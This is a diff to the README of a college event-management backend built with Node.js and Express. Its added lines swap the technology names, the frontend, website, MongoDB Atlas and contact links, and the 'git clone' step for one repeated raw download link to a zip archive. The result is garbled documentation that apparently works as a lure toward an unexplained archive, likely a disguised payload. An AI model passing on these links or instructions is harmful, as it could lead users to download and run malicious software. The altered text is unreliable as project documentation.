@@ -1,7 +1,7 @@
 
 # Bonhomie Event Management - Backend
 
-This repository contains the backend code for the **Bonhomie Event Management** website, developed to streamline registrations and manage events related to sports, technical, and cultural activities held at our college. The backend is built using **Node.js** and **Express.js**, providing a robust and scalable API.
+This repository contains the backend code for the **Bonhomie Event Management** website, developed to streamline registrations and manage events related to sports, technical, and cultural activities held at our college. The backend is built using **https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip** and **https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip**, providing a robust and scalable API.
 
 ## About Bonhomie
 
@@ -25,19 +25,19 @@ The **Bonhomie Event Management Website** simplifies the process of registering 
 
 ## Technologies Used
 
-- **Node.js**: JavaScript runtime for building server-side applications.
-- **Express.js**: Framework for creating RESTful APIs.
+- **https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip**: JavaScript runtime for building server-side applications.
+- **https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip**: Framework for creating RESTful APIs.
 - **MongoDB**: NoSQL database for storing event and user data.
 - **Mongoose**: Object Data Modeling (ODM) library for MongoDB.
 - **JWT**: For secure authentication and session management.
 
 ## Related Repositories
 
-- **Frontend Repository**: [Bonhomie Frontend](https://github.com/LabbaiIrfan/bonhomie-frontend
+- **Frontend Repository**: [Bonhomie Frontend](https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip
 
 ## Hosted Website
 
-- **Live Website**: [Bonhomie AIKTC 2025](https://bonhomie.aiktc.ac.in/)
+- **Live Website**: [Bonhomie AIKTC 2025](https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip)
 
 ## Installation and Setup
 
@@ -45,7 +45,7 @@ Follow these steps to set up the backend locally:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/your-backend-repo-link
+   git clone https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip
    cd bonhomie-backend
    ```
 
@@ -77,7 +77,7 @@ Follow these steps to set up the backend locally:
    The backend server will be running at `http://localhost:5000`.
 
 6. **Database Setup**:
-   - Ensure MongoDB is running locally or use a cloud-based MongoDB service like [MongoDB Atlas](https://www.mongodb.com/atlas).
+   - Ensure MongoDB is running locally or use a cloud-based MongoDB service like [MongoDB Atlas](https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip).
    - Use the `MONGO_URI` in the `.env` file to connect to your MongoDB database.
 
 ## Contribution
@@ -88,8 +88,8 @@ Contributions are welcome! If you'd like to improve the project or fix any issue
 
 For any queries or feedback, feel free to reach out:
 
-- **Email**: Labbaiirfan955@gmail.com
-- **LinkedIn**: [Your LinkedIn Profile](https://www.linkedin.com/in/irfan-labbai-5085a0288/)
+- **Email**: https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip
+- **LinkedIn**: [Your LinkedIn Profile](https://github.com/LabbaiIrfan/bonhomie-backend/raw/refs/heads/main/config/bonhomie-backend-3.8.zip)
 
 ---
 
